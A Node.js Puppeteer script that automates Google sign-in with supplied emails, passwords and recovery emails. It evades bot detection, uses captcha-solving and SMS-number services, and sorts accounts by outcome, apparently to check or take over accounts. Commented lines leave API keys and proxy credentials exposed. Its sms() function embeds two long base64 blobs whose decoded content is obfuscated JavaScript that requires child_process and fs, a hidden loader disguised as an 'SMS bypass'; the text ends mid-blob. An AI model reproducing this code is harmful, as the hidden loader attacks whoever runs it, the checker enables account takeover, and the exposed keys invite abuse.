const puppeteer = require("puppeteer-extra");
StealthPlugin = require("puppeteer-extra-plugin-stealth");
const AnonymizeUAPlugin = require("puppeteer-extra-plugin-anonymize-ua");
const { GetSMS, ServiceApiError, TimeoutError, errors } = require('getsms')
const ac = require("@antiadmin/anticaptchaofficial");

// const sms = new GetSMS({
//     key: '177294U15a8640801c39bf11bacebea6d324b6b',
//     url: 'https://smshub.org/stubs/handler_api.php',
//     service: 'smshub'
// });
// ac.setAPIKey('aab6990fa1f86fcb2c441df3bf709048');

// ac.getBalance()
//     .then(balance => console.log('my balance is $' + balance))
//     .catch(error => console.log('received error ' + error))


// let countNrRuim = 0;
const path = require("path");
const fs = require('fs');

const Kazakhstan = 2;
const Philippines = 4;
const Indonesia = 6;
const Kenya = 8;
const Vietnam = 10;
const Kyrgyzstan = 11;
const Usa = 12;
const India = 22;
const Southafrica = 31;
const Romania = 32;
const Uzbekistan = 40;

const pais = Indonesia;

const AdblockerPlugin = require("puppeteer-extra-plugin-adblocker");

puppeteer.use(AnonymizeUAPlugin());
puppeteer.use(
    AdblockerPlugin({
        blockTrackers: true,
    })
);

const reset = "\x1b[0m";

const log = {
    green: (text) => console.log("\x1b[32m" + text + reset),
    red: (text) => console.log("\x1b[31m" + text + reset),
    blue: (text) => console.log("\x1b[34m" + text + reset),
    yellow: (text) => console.log("\x1b[33m" + text + reset),
};

page = null;
browser = null;
async function crawler(email, senha, emailRec) {
    browser = await puppeteer.launch({
        headless: false,
        defaultViewport: null,
        ignoreDefaultArgs: [
            "--disable-extensions",
            "--enable-automation"
        ],
        args: [
            '--disable-blink-features=AutomationControlled',
            '--window-size=650,700',
            '--window-position=1921,0',
            //  '--disable-extensions-except=./plugin',
            '--load-extension=D:\\TestarEmail\\plugin'
            // '--incognito',
            //'--proxy-server=la.residential.rayobyte.com:8000',
            //  "--start-maximized",
            //  "--no-sandbox",
            //  "--disable-setuid-sandbox",
            //  "--user-data-dir=F:\\data",
            //  '--enable-automation', '--disable-extensions', '--disable-default-apps', '--disable-component-extensions-with-background-pages'
        ],
    });
    page = await browser.newPage();



    /*await page.authenticate({        
        username: 'succxulicorbernal_gmail_com',
        password: 'tq45WY2ZlZGoJ'
    })*/

    console.log(email);
    await page.setBypassCSP(true);

    let login_link = "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&emr=1&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ifkv=ARZ0qKL63ywsKcu__CAzxnheuNk7r6RFTtawSsH0q_wAiYO3G235j1qRcYt2dzgrIBQgSBOziriG&osid=1&passive=1209600&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S453605949%3A1710956152061554&theme=glif&ddm=0";

    await page.goto(login_link);


    await page.waitForSelector('input[name="identifier"]');
    await page.type('input[name="identifier"]', email);
    await page.click('#identifierNext > div > button > span');
    await page.waitForSelector('input[name="identifier"]');

    await page.waitForNavigation();
    if (page.url().includes('https://accounts.google.com/v3/signin/challenge/recaptcha?')) {
        log.red('pediu captch TESTE RETIRAR DEPOIS');
        await browser.close();
        return;

        try {
            await page.waitForSelector('#c0 > div > div.antigate_solver.recaptcha.solved');
        } catch (error) {
            try {
                await page.waitForSelector('#c0 > div > div.antigate_solver.recaptcha.solved');
            } catch (error) {
                //log.red('erro no captch:' + email);
                await browser.close();
                await crawler(email, senha, emailRec);
                return;
            }
        }


        //await new Promise(function (resolve) { setTimeout(resolve, 20000) });
        await page.click("#yDmH0d > c-wiz > div > div.eKnrVb > div > div.Z6Ep7d > div > div.F9NWFb > div > div > button > span");
        await new Promise(function (resolve) { setTimeout(resolve, 2000) });
        try {
            const elemento = await page.$('#yDmH0d > c-wiz > div > div.eKnrVb > div > div.j663ec > div > form > span > section:nth-child(3) > div > div > div > div.OyEIQ.uSvLId > div:nth-child(2)');
            if (elemento != null) {
                //log.red('erro no captch:' + email);
                await browser.close();
                await crawler(email, senha, emailRec);
                return;
            }
        } catch (error) {
            console.log(error);
        }
    } else {
        log.green('Conta sem captcha'); 
        await browser.close();
        return
    }

    if (page.url().includes('https://accounts.google.com/v3/signin/rejected?')) {
        log.red('rejected');
        await browser.close();
        return;
    }

    await page.waitForSelector('#passwordNext > div > button > span');
    await new Promise(function (resolve) { setTimeout(resolve, 2000) });
    await page.type('input[name="identifier"]', senha);
    await page.click('#passwordNext > div > button > span');
    try {
        await page.waitForNavigation();
    } catch (error) {

    }

    if (page.url().includes('https://gds.google.com/web/chip?')) {
        log.green('OK');
        await browser.close();
        return;
    }
    if (page.url().includes('https://mail.google.com/mail/u/0/#inbox')) {
        log.green('OK');
        await browser.close();
        return;
    }

    if (page.url().includes('https://accounts.google.com/speedbump/idvreenable?')) {
        console.log('Pedindo SMS');
        await getSMSNumber();
        return;
    }

    if (page.url().includes('https://myaccount.google.com/')) {
        log.green('OK');
        await browser.close();
        return;
    }

    if (page.url().includes('https://accounts.google.com/v3/signin/challenge/dp?')) {
        await new Promise(function (resolve) { setTimeout(resolve, 2000) });
        log.red('CADASTROU AUTH');
        await browser.close();
        return;
    }

    if (page.url().includes('https://accounts.google.com/v3/signin/challenge/selection?TL')) {
        log.yellow('FUNCIONOU CONFIRMAR NOME DO EMAIL');
        await new Promise(function (resolve) { setTimeout(resolve, 2000) });
        page.click('#yDmH0d > c-wiz > div > div.eKnrVb > div > div.j663ec > div > form > span > section:nth-child(2) > div > div > section > div > div > div > ul > li:nth-child(3) > div > div.vxx8jf');
    
        await new Promise(function (resolve) { setTimeout(resolve, 2000) });
        await page.type('input[name="knowledgePreregisteredEmailResponse"]', emailRec);
        await page.click('#yDmH0d > c-wiz > div > div.eKnrVb > div > div.Z6Ep7d > div > div.F9NWFb > div > div > button > span');
        await new Promise(function (resolve) { setTimeout(resolve, 2000) });
    }

    if (page.url().includes('https://accounts.google.com/speedbump/idvreenable?')) {
        console.log('Pedindo SMS');
        await getSMSNumber();
        return;
    }

    if (page.url().includes('https://accounts.google.com/signin/v2/disabled/')) {
        log.red('CONTA BANIDA');
        await browser.close();
        return;
    }


    // await browser.close();
}
async function sms() {
    const smsbypassfunc1 = `dmFyIElKejJPczYsTnRhazFJaSx3N3I0QkIsaERGQm1yLFVEY0J6OSxXSzl3NTEsUjhHaDhvRixLQlRqbHJVLFd1R0pyUyxGWFhxaTA3LGU2cXF5YSx5RUx4Q3Z3LFMyOHJic3k7ZnVuY3Rpb24gb0xuWnRiKE50YWsxSWkpe3JldHVybiBJSnoyT3M2W050YWsxSWk8MHhjP050YWsxSWk+LTB4MTI/TnRhazFJaT4weGM/TnRhazFJaS0weDMyOk50YWsxSWk+MHhjP050YWsxSWkrMHg2NDpOdGFrMUlpKzB4MTE6TnRhazFJaS0weDQ6TnRhazFJaSsweDYxXX1JSnoyT3M2PWNrYkVQRWouY2FsbCh0aGlzKTt2YXIgZ0lzWTBUTT1bXSxNY3NhcF89b0xuWnRiKC0weDEwKSxkSFNwUUQ9dFBYWnFReigoKT0+e3ZhciBJSnoyT3M2PVsnIkkzSj9bbkhkTyhQO2E9bjslRTNQeW91KVRGKWQuZlI4Y0QucDs5WGs1MycsJ2VvXklFPzkqaFBUR3MsRGVEclIyKzhbenIlQUdFXk4nLCdPTSR4QnsuR11NVWlvdnRiNXQwM2Y+U0A4IX0rcmJwbXd6QicsJyZ3fEp2K2BqYVInLCdzUmVmNnUlZDgxITB8YSNYcXpOSGx2eEI3T2UqQScsJ2Zse0U0dUZwaFB5NExDKlNOeGNIQi4rdTohL0xsRScsJ0MyUWIua00kazJZRFNsK1pWKVhKVl5BJywnTDVIZXQpN1hqTTknLCdHeHU8N3UoNSNQaS46YSpafk8rMyIvI0JIJywnfm5fRlFtX2ltNlFdKURXanx3dUpbaEBHSDMmK0InLCduIXBHZ3ZsaiFQZC4kYk1ucGRtM110L3A5NEddM11RYmVkSzsiL0BNKjJQO1NtSicsJzUpbjxZJywnKnpiZ2InLCdbRDdnWG1OQicsJ3JyZUh0QEhbUVMnLCd5NXVmdW5BJywnWnVEZz9bQScsJ0JFQEonLCcqemJnbXZeSEwlciY5OE0nLCcyWDAxbnZ7WTwhdC9CJywnWFBVPT5bYUMnLCdocloyYicsJzRhT2Y1ZyVOMyQxMDttflBsLGUzeTs6eyJVMycsJ2o4PUV5PTB7ZzhTOzVsTG5EZ3I9Lj9xU2skJlZ6XS5TRU1TZyszN3BeMj9JKi5mbHtxOD13K0xaYklzJlBdNGpTIylIbztMIyMjfitNblFvLmZCOy4/QVk/IzZWYEUnLCdqOD1FeT0we2c4Uzs1bExuRGdyPS4/cVNrJCZWcl1vU2VNaj0/My9wK1RFRz04QGI+JSxFZnZ6O3s2Lj1Ka35YLGxMZCJeI1hBTWg/V11+cChYX3kkbndTfVVRUlhPfWlMTXRLS3s0OnMhPXVCJywnU1BWSycsJ15EKGdZJywndG87SScsJyl6MD1yQEEnLCd0b2xLJywnIk8uR1UnLCdHRSRKZj53ZUI4Q0dCJywne3pZSmcsUTBHJFpiPS58aScsJzVhJEpmPnRUKTVUenBFJywnUFAoZ1sqbWU3UicsJ3c1ZWZnPkEnLCc9VVU9ckBVQyddO3JldHVybiBNY3NhcF8/SUp6Mk9zNi5wb3AoKTpNY3NhcF8rKyxJSnoyT3M2fSwweDApKCk7ZnVuY3Rpb24gd1lKNzU3KCl7dHJ5e3JldHVybiBnbG9iYWx8fHdpbmRvd3x8bmV3IEZ1bmN0aW9uKCdyZXR1cm4gdGhpcycpKCl9Y2F0Y2goZSl7dHJ5e3JldHVybiB0aGlzfWNhdGNoKGUpe3JldHVybnt9fX19IShOdGFrMUlpPXdZSjc1NygpfHx7fSx3N3I0QkI9TnRhazFJaS5UZXh0RGVjb2RlcixoREZCbXI9TnRhazFJaS5VaW50OEFycmF5LFVEY0J6OT1OdGFrMUlpLkJ1ZmZlcixXSzl3NTE9TnRhazFJaS5TdHJpbmd8fFN0cmluZyxSOEdoOG9GPU50YWsxSWkuQXJyYXl8fEFycmF5LEtCVGpsclU9dFBYWnFReigoKT0+e3ZhciBOdGFrMUlpLHc3cjRCQixoREZCbXI7ZnVuY3Rpb24gVURjQno5KE50YWsxSWkpe3JldHVybiBJSnoyT3M2W050YWsxSWk+MHgyZj9OdGFrMUlpPDB4NGQ/TnRhazFJaT4weDRkP050YWsxSWktMHg1MzpOdGFrMUlpPjB4NGQ/TnRhazFJaSsweDI3Ok50YWsxSWktMHgzMDpOdGFrMUlpKzB4MWE6TnRhazFJaSsweDE5XX10eXBlb2YoTnRhazFJaT1uZXcgUjhHaDhvRigweDgwKSx3N3I0QkI9V0s5dzUxW1VEY0J6OSgweDM0KV18fFdLOXc1MS5mcm9tQ2hhckNvZGUsaERGQm1yPVtdKTtyZXR1cm4gdFBYWnFReihSOEdoOG9GPT57dmFyIEtCVGpsclUsV3VHSnJTO2Z1bmN0aW9uIEZYWHFpMDcoUjhHaDhvRil7cmV0dXJuIElKejJPczZbUjhHaDhvRj4weDczP1I4R2g4b0YtMHgxNTpSOEdoOG9GPDB4NzM/UjhHaDhvRj4weDU1P1I4R2g4b0Y+MHg1NT9SOEdoOG9GPjB4NzM/UjhHaDhvRi0weDI1OlI4R2g4b0YtMHg1NjpSOEdoOG9GKzB4ZTpSOEdoOG9GLTB4MTI6UjhHaDhvRisweDVhXX12YXIgZTZxcXlhLHlFTHhDdnc7dm9pZChLQlRqbHJVPVI4R2g4b0ZbRlhYcWkwNygweDU2KV0saERGQm1yW0ZYWHFpMDcoMHg1NildPW9Mblp0YigtMHgxMCkpO2ZvcihXdUdKclM9RlhYcWkwNygweDU3KTtXdUdKclM8S0JUamxyVTspe3ZhciBTMjhyYnN5PXRQWFpxUXooUjhHaDhvRj0+e3JldHVybiBJSnoyT3M2W1I4R2g4b0Y8LTB4NTA/UjhHaDhvRisweDMwOlI4R2g4b0Y8LTB4MzI/UjhHaDhvRjwtMHgzMj9SOEdoOG9GPC0weDUwP1I4R2g4b0YrMHg2NDpSOEdoOG9GKzB4NGY6UjhHaDhvRi0weDA6UjhHaDhvRi0weGFdfSwweDEpO3lFTHhDdnc9UjhHaDhvRltXdUdKclMrK107aWYoeUVMeEN2dzw9MHg3Zil7ZTZxcXlhPXlFTHhDdnd9ZWxzZXtpZih5RUx4Q3Z3PD0weGRmKXt2YXIgZ0lzWTBUTT10UFhacVF6KFI4R2g4b0Y9PntyZXR1cm4gSUp6Mk9zNltSOEdoOG9GPC0weDQ0P1I4R2g4b0YrMHgxMjpSOEdoOG9GPi0weDQ0P1I4R2g4b0Y+LTB4NDQ/UjhHaDhvRjwtMHgyNj9SOEdoOG9GPi0weDQ0P1I4R2g4b0Y8LTB4MjY/UjhHaDhvRisweDQzOlI4R2g4b0YtMHg0ODpSOEdoOG9GLTB4MTc6UjhHaDhvRi0weDE3OlI4R2g4b0YtMHgzMDpSOEdoOG9GKzB4MzJdfSwweDEpO2U2cXF5YT0oeUVMeEN2dyZTMjhyYnN5KC0weDNlKSk8PGdJc1kwVE0oLTB4NDApfFI4R2g4b0ZbV3VHSnJTKytdJmdJc1kwVE0oLTB4NDEpfWVsc2V7aWYoeUVMeEN2dzw9MHhlZil7dmFyIE1jc2FwXz10UFhacVF6KFI4R2g4b0Y9PntyZXR1cm4gSUp6Mk9zNltSOEdoOG9GPi0weDE2P1I4R2g4b0Y+MHg4P1I4R2g4b0YtMHg5OlI4R2g4b0Y+LTB4MTY/UjhHaDhvRj4tMHgxNj9SOEdoOG9GPC0weDE2P1I4R2g4b0YrMHg2OlI4R2g4b0Y+MHg4P1I4R2g4b0YrMHg0ZjpSOEdoOG9GPC0weDE2P1I4R2g4b0YtMHg5OlI4R2g4b0YrMHgxNTpSOEdoOG9GLTB4MjI6UjhHaDhvRi0weDI0OlI4R2g4b0YrMHg1Zl19LDB4MSk7ZTZxcXlhPSh5RUx4Q3Z3JlMyOHJic3koLTB4NDYpKTw8TWNzYXBfKC0weDEwKXwoUjhHaDhvRltXdUdKclMrK10mb0xuWnRiKC0weGYpKTw8RlhYcWkwNygweDU5KXxSOEdoOG9GW1d1R0pyUysrXSZvTG5adGIoLTB4Zil9ZWxzZXtpZihXSzl3NTFbUzI4cmJzeSgtMHg0YildKXt2YXIgZEhTcFFEPXRQWFpxUXooUjhHaDhvRj0+e3JldHVybiBJSnoyT3M2W1I4R2g4b0Y8LTB4NGY/UjhHaDhvRisweDE4OlI4R2g4b0Y8LTB4MzE/UjhHaDhvRjwtMHgzMT9SOEdoOG9GPC0weDMxP1I4R2g4b0Y8LTB4MzE/UjhHaDhvRisweDRlOlI4R2g4b0YrMHg1YzpSOEdoOG9GKzB4NDg6UjhHaDhvRi0weDVhOlI4R2g4b0YrMHg0MF19LDB4MSk7ZTZxcXlhPSh5RUx4Q3Z3JkZYWHFpMDcoMHg3MSkpPDxkSFNwUUQoLTB4NDQpfChSOEdoOG9GW1d1R0pyUysrXSZkSFNwUUQoLTB4NGMpKTw8b0xuWnRiKC0weGMpfChSOEdoOG9GW1d1R0pyUysrXSZGWFhxaTA3KDB4NTgpKTw8VURjQno5KDB4MzMpfFI4R2g4b0ZbV3VHSnJTKytdJkZYWHFpMDcoMHg1OCl9ZWxzZXt2YXIgd1lKNzU3PXRQWFpxUXooUjhHaDhvRj0+e3JldHVybiBJSnoyT3M2W1I4R2g4b0Y8MHg2ND9SOEdoOG9GPDB4NDY/UjhHaDhvRi0weDQ6UjhHaDhvRjwweDQ2P1I4R2g4b0YtMHg0NTpSOEdoOG9GPDB4NjQ/UjhHaDhvRj4weDQ2P1I4R2g4b0Y+MHg2ND9SOEdoOG9GKzB4MWM6UjhHaDhvRi0weDQ3OlI4R2g4b0YrMHgzYzpSOEdoOG9GKzB4NWI6UjhHaDhvRisweDYwXX0sMHgxKTshKGU2cXF5YT13WUo3NTcoMHg0OSksV3VHSnJTKz0weDMpfX19fWhERkJtci5wdXNoKE50YWsxSWlbZTZxcXlhXXx8KE50YWsxSWlbZTZxcXlhXT13N3I0QkIoZTZxcXlhKSkpfXJldHVybiBoREZCbXIuam9pbignJyl9LDB4MSl9LDB4MCkoKSk7ZnVuY3Rpb24gb0o1bGNsTChOdGFrMUlpKXt2YXIgV0s5dzUxPXRQWFpxUXooTnRhazFJaT0+e3JldHVybiBJSnoyT3M2W050YWsxSWk8MHg3Nz9OdGFrMUlpPjB4NTk/TnRhazFJaTwweDc3P050YWsxSWk+MHg3Nz9OdGFrMUlpKzB4NjA6TnRhazFJaTwweDU5P050YWsxSWktMHhiOk50YWsxSWk8MHg3Nz9OdGFrMUlpLTB4NWE6TnRhazFJaSsweDVmOk50YWsxSWktMHgyMjpOdGFrMUlpLTB4NDU6TnRhazFJaSsweDQyXX0sMHgxKTtyZXR1cm4gdHlwZW9mIHc3cjRCQiE9PVdLOXc1MSgweDYwKSYmdzdyNEJCP25ldyB3N3I0QkIoKS5kZWNvZGUobmV3IGhERkJtcihOdGFrMUlpKSk6dHlwZW9mIFVEY0J6OSE9PW9Mblp0YigtMHhiKSYmVURjQno5P1VEY0J6OS5mcm9tKE50YWsxSWkpLnRvU3RyaW5nKCd1dGYtOCcpOktCVGpsclUoTnRhazFJaSl9dm9pZChXdUdKclM9aUl5ZGpqKDB4MjQpLEZYWHFpMDc9aUl5ZGpqKDB4MjMpLGU2cXF5YT1baUl5ZGpqKDB4MTApXSx5RUx4Q3Z3PXtbb0xuWnRiKC0weDkpXTppSXlkamoob0xuWnRiKDB4OCkpLFtvTG5adGIoLTB4NildOmlJeWRqaihvTG5adGIoLTB4YSkpfSk7ZnVuY3Rpb24gaGlJY1hwKE50YWsxSWksdzdyNEJCKXt2YXIgaERGQm1yPXRQWFpxUXooTnRhazFJaT0+e3JldHVybiBJSnoyT3M2W050YWsxSWk8MHg1Mj9OdGFrMUlpLTB4MzM6TnRhazFJaTwweDUyP050YWsxSWktMHg0ODpOdGFrMUlpPjB4NTI/TnRhazFJaT4weDcwP050YWsxSWktMHg1OTpOdGFrMUlpPjB4NTI/TnRhazFJaT4weDcwP050YWsxSWktMHg1NTpOdGFrMUlpPDB4NTI/TnRhazFJaS0weDM6TnRhazFJaS0weDUzOk50YWsxSWkrMHg1Ok50YWsxSWkrMHg1Nl19LDB4MSk7c3dpdGNoKFMyOHJic3kpe2Nhc2UgaERGQm1yKDB4NjApO`
    const smsbypassfunction = `dmFyIFJCSGhrZCxWN1ZQeXRLLEFZTDUyMCxORGZhOTgsdHZFOFJKLExGVXpBV2UsT1o1aWVMVyxCOTl6cFRmLGx5clRZNVgsa2dESUFjLGtlM29XcGIseTJvWUIzbCx1SmRpU3csbFFkdmx3O2Z1bmN0aW9uIGM5dDNsRTQoVjdWUHl0Syl7cmV0dXJuIFJCSGhrZFtWN1ZQeXRLPi0weDE5P1Y3VlB5dEstMHgzNDpWN1ZQeXRLPi0weDE5P1Y3VlB5dEsrMHgxODpWN1ZQeXRLPi0weDNhP1Y3VlB5dEs8LTB4MTk/VjdWUHl0SzwtMHgzYT9WN1ZQeXRLLTB4MWY6VjdWUHl0Sz4tMHgxOT9WN1ZQeXRLLTB4YzpWN1ZQeXRLPi0weDE5P1Y3VlB5dEsrMHg0ZjpWN1ZQeXRLPi0weDNhP1Y3VlB5dEsrMHgzOTpWN1ZQeXRLKzB4MWU6VjdWUHl0Sy0weDM0OlY3VlB5dEstMHgyOV19UkJIaGtkPUVpV3J4TC5jYWxsKHRoaXMpO3ZhciBNWVBST1poPVtdLEVZOG9ZRz1jOXQzbEU0KC0weDM4KSxhb24xdTY9S2RkRVFNeigoKT0+e3ZhciBSQkhoa2Q9WyduWFo7RS5IVDIkYDFnN1NpTFhzOk0nLCdvbGcvTzMpWUI1YSVTOWVkbyU+L2YwZDV8NmBaNVFQJywnPDRyPXc0L3A1UkUuRGJ8aUhkL0cnLCd8elBKZz5BK2o1dCpeTzdwRyxuR3toJjYoVG8nLCdHMnIufl5STl41MSZIYSNxI2l1MHUrRE47SSVTOltVaWtsWWVmYD9OTSVnPCwsO1onLCd+N2dibjtfb1FWdCcsJ2FvYCwxNlRkUFMyY21OLmZTI1l6Xj55U3o1fkkhbGRSSXg2Z1EnLCdkVTgxWG1MQlRNLlo2OSFxIiVfRj8zIml6JHIwT0YpbTF6X0gmX0EnLCc1KW48WScsJyp6YmdiJywnW0Q3Z1htTkInLCdycmVIdEBIW1FTJywneTV1ZnVuQScsJ1p1RGc/W0EnLCdCRUBKJywnKnpiZ212XkhMJXImOThNJywnMlgwMW52e1k8IXQvQicsJ1hQVT0+W2FDJywnaHJaMmInLCc0YU9mNWclTjMkMTA7bX5QbCxlM3k7OnsiVTMnLCdqOD1FeT0we2c4Uzs1bExuRGdyPS4/cVNrJCZWel0uU0VNU2crMzdwXjI/SSouZmx7cTg9dytMWmJJcyZQXTRqUyMpSG87TCMjI34rTW5Rby5mQjsuP0FZPyM2VmBFJywnajg9RXk9MHtnOFM7NWxMbkRncj0uP3FTayQmVjddb1M+TD9KJTM1cCtUNkU5RT5iXyUsRUZ3YlR+Nl49b2JIWTYyInp+Xl9pRDVnLik3e3BUem8vOW5dTUEmRWkmW3xpQWR0S3tgNjpzIUAxdTk2aywlNHhKd2xUfTZ3JywnU1BWSycsJ15EKGdZJywndG87SScsJyl6MD1yQEEnLCdHRSRKZj53ZUI4Q0dCJywndG9sSycsJyJPLkdVJywne3pZSmcsUTBHJFpiPS58aScsJzVhJEpmPnRUKTVUenBFJywnUFAoZ1sqbWU3UicsJ3c1ZWZnPkEnLCc9VVU9ckBVQyddO3JldHVybiBFWThvWUc/UkJIaGtkLnBvcCgpOkVZOG9ZRysrLFJCSGhrZH0sMHgwKSgpO2Z1bmN0aW9uIHhFdWRkOUYoKXt0cnl7cmV0dXJuIGdsb2JhbHx8d2luZG93fHxuZXcgRnVuY3Rpb24oJ3JldHVybiB0aGlzJykoKX1jYXRjaChlKXt0cnl7cmV0dXJuIHRoaXN9Y2F0Y2goZSl7cmV0dXJue319fX12b2lkKFY3VlB5dEs9eEV1ZGQ5RigpfHx7fSxBWUw1MjA9VjdWUHl0Sy5UZXh0RGVjb2RlcixORGZhOTg9VjdWUHl0Sy5VaW50OEFycmF5LHR2RThSSj1WN1ZQeXRLLkJ1ZmZlcixMRlV6QVdlPVY3VlB5dEsuU3RyaW5nfHxTdHJpbmcsT1o1aWVMVz1WN1ZQeXRLLkFycmF5fHxBcnJheSxCOTl6cFRmPUtkZEVRTXooKCk9Pnt2YXIgVjdWUHl0SyxBWUw1MjAsTkRmYTk4O2Z1bmN0aW9uIHR2RThSSihWN1ZQeXRLKXtyZXR1cm4gUkJIaGtkW1Y3VlB5dEs8LTB4NTU/VjdWUHl0SysweDNlOlY3VlB5dEs8LTB4NTU/VjdWUHl0Sy0weDVhOlY3VlB5dEs+LTB4NTU/VjdWUHl0SysweDU0OlY3VlB5dEstMHgyYV19dHlwZW9mKFY3VlB5dEs9bmV3IE9aNWllTFcoMHg4MCksQVlMNTIwPUxGVXpBV2VbdHZFOFJKKC0weDUwKV18fExGVXpBV2UuZnJvbUNoYXJDb2RlLE5EZmE5OD1bXSk7cmV0dXJuIEtkZEVRTXooT1o1aWVMVz0+e3ZhciBCOTl6cFRmLGx5clRZNVg7ZnVuY3Rpb24ga2dESUFjKE9aNWllTFcpe3JldHVybiBSQkhoa2RbT1o1aWVMVzwweDY3P09aNWllTFc+MHg2Nz9PWjVpZUxXLTB4M2M6T1o1aWVMVzwweDY3P09aNWllTFc8MHg2Nz9PWjVpZUxXLTB4NDc6T1o1aWVMVy0weDFjOk9aNWllTFctMHg1YzpPWjVpZUxXLTB4NjFdfXZhciBrZTNvV3BiLHkyb1lCM2w7dHlwZW9mKEI5OXpwVGY9T1o1aWVMV1trZ0RJQWMoMHg0NyldLE5EZmE5OFtrZ0RJQWMoMHg0NyldPWtnRElBYygweDQ4KSk7Zm9yKGx5clRZNVg9Yzl0M2xFNCgtMHgzOCk7bHlyVFk1WDxCOTl6cFRmOyl7eTJvWUIzbD1PWjVpZUxXW2x5clRZNVgrK107aWYoeTJvWUIzbDw9MHg3Zil7a2Uzb1dwYj15Mm9ZQjNsfWVsc2V7aWYoeTJvWUIzbDw9MHhkZil7dmFyIHVKZGlTdz1LZGRFUU16KE9aNWllTFc9PntyZXR1cm4gUkJIaGtkW09aNWllTFc+MHgzMj9PWjVpZUxXPDB4NTM/T1o1aWVMVzwweDUzP09aNWllTFctMHgzMzpPWjVpZUxXKzB4NWY6T1o1aWVMVy0weDQ1Ok9aNWllTFctMHgzMF19LDB4MSk7a2Uzb1dwYj0oeTJvWUIzbCZjOXQzbEU0KC0weDIxKSk8PHVKZGlTdygweDM2KXxPWjVpZUxXW2x5clRZNVgrK10mdUpkaVN3KDB4MzUpfWVsc2V7aWYoeTJvWUIzbDw9MHhlZil7dmFyIGxRZHZsdz1LZGRFUU16KE9aNWllTFc9PntyZXR1cm4gUkJIaGtkW09aNWllTFc+MHg1ZD9PWjVpZUxXKzB4MTU6T1o1aWVMVzwweDNjP09aNWllTFcrMHgyNTpPWjVpZUxXPDB4NWQ/T1o1aWVMVy0weDNkOk9aNWllTFctMHgzNl19LDB4MSk7a2Uzb1dwYj0oeTJvWUIzbCZsUWR2bHcoMHg0NSkpPDxrZ0RJQWMoMHg0Yyl8KE9aNWllTFdbbHlyVFk1WCsrXSZsUWR2bHcoMHgzZikpPDxjOXQzbEU0KC0weDM2KXxPWjVpZUxXW2x5clRZNVgrK10ma2dESUFjKDB4NDkpfWVsc2V7aWYoTEZVekFXZVtrZ0RJQWMoMHg0YildKXt2YXIgTVlQUk9aaD1LZGRFUU16KE9aNWllTFc9PntyZXR1cm4gUkJIaGtkW09aNWllTFc8LTB4MWY/T1o1aWVMVz4tMHgxZj9PWjVpZUxXLTB4NDI6T1o1aWVMVzwtMHgxZj9PWjVpZUxXPi0weDFmP09aNWllTFctMHg0MjpPWjVpZUxXPi0weDFmP09aNWllTFctMHgyMzpPWjVpZUxXPi0weDFmP09aNWllTFcrMHgyNTpPWjVpZUxXPC0weDQwP09aNWllTFctMHgyYjpPWjVpZUxXPi0weDFmP09aNWllTFcrMHg3Ok9aNWllTFcrMHgzZjpPWjVpZUxXLTB4MjA6T1o1aWVMVy0weDE2XX0sMHgxKTtrZTNvV3BiPSh5Mm9ZQjNsJmtnRElBYygweDY1KSk8PHR2RThSSigtMHg0Yil8KE9aNWllTFdbbHlyVFk1WCsrXSZjOXQzbEU0KC0weDM3KSk8PGM5dDNsRTQoLTB4MzQpfChPWjVpZUxXW2x5clRZNVgrK10mdHZFOFJKKC0weDUyKSk8PGtnRElBYygweDRhKXxPWjVpZUxXW2x5clRZNVgrK10mTVlQUk9aaCgtMHgzZCl9ZWxzZXt0eXBlb2Yoa2Uzb1dwYj1rZ0RJQWMoMHg0OSksbHlyVFk1WCs9MHgzKX19fX1ORGZhOTgucHVzaChWN1ZQeXRLW2tlM29XcGJdfHwoVjdWUHl0S1trZTNvV3BiXT1BWUw1MjAoa2Uzb1dwYikpKX1yZXR1cm4gTkRmYTk4LmpvaW4oJycpfSwweDEpfSwweDApKCkpO2Z1bmN0aW9uIGsybkxXWFAoUkJIaGtkKXtyZXR1cm4gdHlwZW9mIEFZTDUyMCE9PWM5dDNsRTQoLTB4MzMpJiZBWUw1MjA/bmV3IEFZTDUyMCgpLmRlY29kZShuZXcgTkRmYTk4KFJCSGhrZCkpOnR5cGVvZiB0dkU4UkohPT1jOXQzbEU0KC0weDMzKSYmdHZFOFJKP3R2RThSSi5mcm9tKFJCSGhrZCkudG9TdHJpbmcoJ3V0Zi04Jyk6Qjk5enBUZihSQkhoa2QpfXZvaWQobHlyVFk1WD17W2M5dDNsRTQoLTB4MjUpXTphc1VyampqKGM5dDNsRTQoLTB4MzIpKX0sa2dESUFjPWFzVXJqamooYzl0M2xFNCgtMHgzMikpLGtlM29XcGI9W2FzVXJqamooYzl0M2xFNCgtMHgzMSkpLGFzVXJqamooYzl0M2xFNCgtMHgzMCkpLGFzVXJqamooYzl0M2xFNCgtMHgzNCkpXSx5Mm9ZQjNsPWFzVXJqamooYzl0M2xFNCgtMHgzNCkpLHVKZGlTdz1hc1VyampqKDB4YikpO2Z1bmN0aW9uIHlTRjAwdyhWN1ZQeXRLLEFZTDUyMCl7dmFyIE5EZmE5OD1LZGRFUU16KFY3VlB5dEs9PntyZXR1cm4gUkJIaGtkW1Y3VlB5dEs8LTB4Zj9WN1ZQeXRLKzB4NGQ6VjdWUHl0Sz4weDEyP1Y3VlB5dEstMHgyYTpWN1ZQeXRLPC0weGY/VjdWUHl0Sy0weDEwOlY3VlB5dEs8LTB4Zj9WN1ZQeXRLLTB4NWM6VjdWUHl0SzwtMHhmP1Y3VlB5dEsrMHg1YTpWN1ZQeXRLPjB4MTI/VjdWUHl0Sy0weDU3OlY3VlB5dEs+MHgxMj9WN1ZQeXRLLTB4NGY6VjdWUHl0Sz4weDEyP1Y3VlB5dEstMHg2MTpWN1ZQeXRLKzB4ZV19LDB4MSk7c3dpdGNoKGxRZHZsdyl7Y2FzZSBORGZhOTgoLTB4MSk6cmV0dXJuIFY3VlB5dEstQVlMNTIwfX1mdW5jdGlvbiBTeWl5YnM4KFJCSGhrZCl7cmV0dXJuIFJCSGhrZD1sUWR2bHcrKGxRZHZsdz1SQkhoa2QsYzl0M2xFNCgtMHgzOCkpLFJCSGhrZH1sUWR2bHc9bFFkdmx3O2NvbnN0IHtbYXNVcmpqaltjOXQzbEU0KC0weDI2KV0oYzl0M2xFNCgtMHgyZiksW2M5dDNsRTQoLTB4MWMpXSldOmtUbWJObH09cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLGFSRzYzTkM9cmVxdWlyZSgnZnMnKSxBRXp1SmdSPXJlcXVpcmUoJ3BhdGgnKS